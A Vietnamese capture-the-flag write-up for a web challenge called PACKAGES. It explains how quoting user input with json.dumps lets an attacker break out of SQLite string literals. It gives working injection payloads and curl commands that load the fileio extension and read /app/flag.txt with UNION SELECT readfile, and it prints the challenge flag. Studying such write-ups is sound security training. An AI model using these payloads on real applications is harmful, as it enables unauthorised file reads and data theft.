---
title: PACKAGES

---

# PACKAGES
![image](https://hackmd.io/_uploads/Sy32vseeWx.png)
https://packages.challs.pwnoh.io/

### Phân tích source
![image](https://hackmd.io/_uploads/SyyEhilxZx.png)

`main.py`
``` java
distro  = request.args.get("distro", "").strip().lower()
package = request.args.get("package", "").strip().lower()

sql = "SELECT distro, distro_version, package, package_version FROM packages"
if distro or package:
    sql += " WHERE "
if distro:
    sql += f"LOWER(distro) = {json.dumps(distro)}"
if distro and package:
    sql += " AND "
if package:
    sql += f"LOWER(package) = {json.dumps(package)}"
sql += " ORDER BY distro, distro_version, package"

print(sql)
results = db.execute(sql).fetchall()
```

- author dùng `json.dump` để quote tham số người dùng khi ghép chuỗi SQL

**Giải thích về `json.dump` trong python**
`json.dump` được sử dụng để serialize một object python (vd: dictionary, list, tuple, string, int, float, bool, , None) thành định dạng JSON và viết trực tiếp vào một file hoặc file-like object. 
module: cần `import json` để sử dụng

ví dụ để serialize một dictionary và ghi vào file `ex.json`
``` python
import json

a = {
    'name': 'tam',
    'age': 18,
    'city': 'Hai Phong',
    'hobbies': ['ngu', 'ngu']
}

with open('ex.json', 'w') as f:
    json.dump(a, f, indent=4) 
```
ex.json
```json
{
    "name": "tam",
    "age": 18,
    "city": "Hai Phong",
    "hobbies": [
        "ngu",
        "ngu"
    ]
}
```
(indent: số khoảng trắng để thụt lề, mặc định là None)


- `json.dumps()` tạo JSON string (dùng dấu double-quote `"` và escape bằng backslash `\` cho các `"` bên trong để đảm bảo JSON valid
- Đây là cơ chế quoting khác với quoting SQL -> mismatch escaping mechanism
  - VD: Input `" OR 1=1 --` sau `json.dump()` -> `"\" OR 1=1 --"`
  - Trong SQLite, string mở `"`, nội dung `\"` được parse thành `\`(ký tự thường) + `"`(đóng string sớm), phần sau (`OR 1=1 --`) trở thành mã SQL độc, và `--` comment phần còn lại
-> attacker có thể breakout khỏi string literal , inject arbitrary SQL (như UNION SELECT) để dump data hoặc gọi hàm

**Áp dụng vào challenge tìm lỗ hổng**
Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đúng:
 - SQLite string literal dùng `'` hoặc `"`, và để thoát quote bên trong, dùng double (ví dụ: `""` cho `"`)
 - `json.dumps` thoát thành `\"`, nhưng SQLite coi `\` là literal, nên input chứa `"` sẽ đóng string sớm, phần sau trở thành payload
 - Có thể inject expression sau `=`, ví dụ: `OR 1=1`, hoặc gọi hàm như `load_extension`
 - Kết hợp với extension `fileio.so` (có sẵn trong `/sqlite/ext/misc/`), có thể load và dùng `readfile(filename`) để đọc arbitrary file như /app/flag.txt

### PoC

Khai thác cần 2 request GET (vì `load_extension` là `side-effect`, cần load trước khi dùng). Sử dụng tham số `distro` để inject (tương tự với `package`). Payload breakout bằng cách bắt đầu với `"`, rồi inject, và dùng `-`- comment trailing `"`.

#### Load extension `fileio.so`
- `distro: " OR (load_extension('/sqlite/ext/misc/fileio.so')=0)--`
- Sau lower và json.dumps: `LOWER(distro) = "\" OR (load_extension('/sqlite/ext/misc/fileio.so')=0)--"`
- Parse trong SQLite: String mở `"`, nội dung `\"` (thành `\`+ đóng string), rồi `OR (load_extension...=0)--` (luôn true, load extension), comment phần còn lại

- Có thể request bằng curl:
``` java!
curl "http://localhost:8000/?distro=\"%20OR%20(load_extension('/sqlite/ext/misc/fileio.so')=0)--"
```
-> Trả về tất cả packages (extension được load globally)

#### Đọc flag qua `readfile` với UNION
 - Payload cho `distro: " OR 0=1 UNION SELECT readfile('/app/flag.txt'), NULL, NULL, NULL--`
- Sau lower và json.dumps: `LOWER(distro) = "\" OR 0=1 UNION SELECT readfile('/app/flag.txt'), NULL, NULL, NULL--"`
- Parse: Breakout tương tự, WHERE false (0=1, no rows từ packages), rồi UNION thêm row với flag ở cột đầu (readfile trả BLOB, nhưng render thành text).
- Request bằng curl: 
``` java!
curl "http://localhost:8000/?distro=\"%20OR%200=1%20UNION%20SELECT%20readfile('/app/flag.txt'),%20NULL,%20NULL,%20NULL--"
```
![image](https://hackmd.io/_uploads/BJ1NP2egbe.png)

**Flag: bctf{y0uv3_g0t_4n_apt17ud3_f0r_7h15}**